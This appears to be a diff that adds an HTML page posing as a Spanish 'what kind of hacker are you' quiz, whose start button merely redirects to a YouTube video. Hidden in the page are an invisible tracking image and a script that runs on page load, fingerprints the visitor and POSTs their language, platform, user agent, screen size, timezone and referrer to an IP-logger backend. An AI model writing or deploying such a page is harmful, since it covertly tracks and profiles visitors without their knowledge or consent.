@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>¿Qué tan creativo eres?</title>
+  </head>
+  <body>
+    <h2>Descubre qué tipo de hacker serías</h2>
+    <p>Responde este test divertido para saber tu arquetipo hacker 🧠💻</p>
+    <button onclick="window.location.href='https://www.youtube.com/watch?v=dQw4w9WgXcQ'">Comenzar</button>
+    <!-- Carga invisible al backend -->
+    <img src="https://tu-ip-logger-backend.onrender.com/" style="display:none;" />
+    <!-- Fingerprinting y recolección pasiva -->
+    <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
+    <script>
+      async function recolectarDatos() {
+        const fp = await FingerprintJS.load();
+        const result = await fp.get();
+        const info = {
+          language: navigator.language,
+          platform: navigator.platform,
+          userAgent: navigator.userAgent,
+          screenWidth: screen.width,
+          screenHeight: screen.height,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          referrer: document.referrer,
+          fingerprint: result.visitorId
+        };
+        fetch("https://tu-ip-logger-backend.onrender.com/info", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(info)
+        });
+      }
+      recolectarDatos();
+    </script>
+  </body>
+</html>
